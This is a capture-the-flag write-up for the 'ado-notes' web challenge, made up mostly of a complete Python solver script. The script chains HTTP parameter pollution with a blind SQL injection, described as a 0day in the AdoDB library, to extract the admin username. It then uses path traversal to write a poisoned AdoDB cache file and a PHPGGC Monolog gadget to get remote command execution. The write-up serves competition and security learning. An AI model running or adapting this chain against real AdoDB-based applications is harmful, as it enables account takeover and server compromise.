# [web] - [ado-notes]

## Author
nyxmare

## Description
Oh my, it's notes app again. I bet everyone loves note app

## Overview & Solution

- parameter pollution
- 0day SQL Injection on AdoDB
- Arbitrary file write
- cache poison
- known deserialization gadget

### Solver

```python
#!/usr/bin/env python3

import requests, random, string, subprocess
from pathlib import Path
from urllib.parse import unquote

debug = 0
proxies = {}
if debug: proxies = {"http":"http://127.0.0.1:8080", "https":"http://127.0.0.1:8080"}
PHPGGC_PATH = str(Path('~').expanduser()) + "/tools/phpggc/phpggc"
URL = "http://localhost:4142/"
headers = {"Content-Type":"application/x-www-form-urlencoded"}
def register(sess, username, password):
    return sess.post(f"{URL}/api/user/register", proxies=proxies, headers=headers, data=f"username=adochan&username={username}&password={password}", verify=False)

def login(sess, username, password):
    return sess.post(f'{URL}/api/user/login', proxies=proxies, headers=headers, data=f"username=adochan&username={username}&password={password}", verify=False)

def create_note(sess, title, content):
    return sess.post(f"{URL}/api/notes", proxies=proxies, headers=headers, data={"title": title, "content": content}, verify=False)

def update_note(sess, id_note, title, content, username = '', attachment = ''):
    return sess.put(f"{URL}/api/notes/{id_note}", proxies=proxies, headers=headers, data={"title": title, "content": content, "username": username, "attachment": attachment}, verify=False)

def search_note(sess, q):
    return sess.get(f"{URL}/api/notes/search?search={q}&page=1", proxies=proxies, verify=False)

def download_note(sess, id_note):
    return sess.get(f"{URL}/download/{id_note}", proxies=proxies, verify=False)

def determine_result(sess, q, retry = 3):
    result = None
    for x in range(retry):
        result = search_note(sess, q)

    if "SERVER_ERROR" in result.text:
        return False
    else:
        return True

def calculate_hash(username):
    # $m = md5($sql.$this->databaseType.$this->database.$this->user.$mode);
    m = f"SELECT COUNT(*) FROM notes WHERE username = '{username}' AND title LIKE ?" + 'a:1:{i:0;s:4:"life";}'+"sqlite30"
    import hashlib
    return hashlib.md5(m.encode('utf-8')).hexdigest()


def random_chars(n=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def main():
    USERNAME = f" ORDER BY 'LIMIT 99 /* {random_chars(6)} "
    PASSWORD = f"adochan1024#"

    print(f"{USERNAME}:{PASSWORD}")

    sess = requests.Session()

    # register SQLI
    register(sess, USERNAME, PASSWORD)
    login(sess, USERNAME, PASSWORD)

    create_note(sess, random_chars(6), random_chars(6))

    # sqli, due to weird cache handling, need to request few times to determine the correct result
    # true_result = determine_result(sess, '*/ and 1=1/1 /*')
    # false_result = determine_result(sess, '*/ and 1=1/0 /*')

    # get length username
    length_username = 0
    for x in range(100):
        result = determine_result(sess,f'*/ and 1=(SELECT username FROM users WHERE id=1 AND LENGTH(username)={x}) /*')
        print(f"Checking {x}: {result}")
        if result:
            length_username = x
            break

    assert length_username != 0
    print(f"Length username: {length_username}")


    prefix_username = ""
    for l in range(length_username):
        for x in string.ascii_letters + string.digits + "-":
            tmp = f"{prefix_username}{x}"
            result = determine_result(sess, f'*/ and 1=(SELECT username FROM users WHERE id=1 AND username LIKE "{tmp}%") /*')
            print(f"Trying {tmp}: {result}")
            if result:
                prefix_username = tmp
                print(f"Known username: {prefix_username}")
                break
    sess.close()

    # prefix_username = "ado-admin-notes-baa69ca0fe0572cec338574daaa3a65d"
    PASSWORD = f"adochan1024#"

    sess = requests.Session()
    USERNAME = "adochan1024#letsgoo"+random_chars(6)
    print(f"{USERNAME}:{PASSWORD}")
    # creating note, since admin cant create note
    sess = requests.Session()
    register(sess, USERNAME, PASSWORD)
    login(sess, USERNAME, PASSWORD)
    id_note = create_note(sess, random_chars(6), random_chars(6)).json()["data"]["id"]

    # making sure the cache creating the folder cache
    search_note(sess, 'life')
    search_note(sess, 'life')
    sess.close()

    # username and password is same in admin acct
    sess = requests.Session()
    login(sess, prefix_username, prefix_username)

    # preparing to write file
    hash_result = calculate_hash(USERNAME)
    print(calculate_hash(USERNAME))
    path_cache = ("/../"*10) + "/tmp/" + hash_result[:2] + f"/adodb_{hash_result}.cache"

    # Monolog/RCE9 gadget
    payload_rce = subprocess.check_output([PHPGGC_PATH, "Monolog/RCE9", "system", "ls / > /tmp/idk"]).decode("utf-8")
    print(payload_rce)
    deserialization_payload = (
        "====1,1938846438,====1,1938846438,SELECT COUNT(*) FROM notes WHERE username = 'asdasdaasdasdaasdasda' AND title LIKE ?" + "\n"
        f"{payload_rce}")
    update_note(sess, id_note, path_cache, random_chars(6), USERNAME, deserialization_payload)

    # write file
    download_note(sess, id_note)
    sess.close()

    # trigger cache
    sess = requests.Session()
    login(sess, USERNAME, PASSWORD)
    search_note(sess, 'life')

main()

```


## Flag
`CJ{bro_is_solving_0day_challenge_on_ADOdb_GG}`
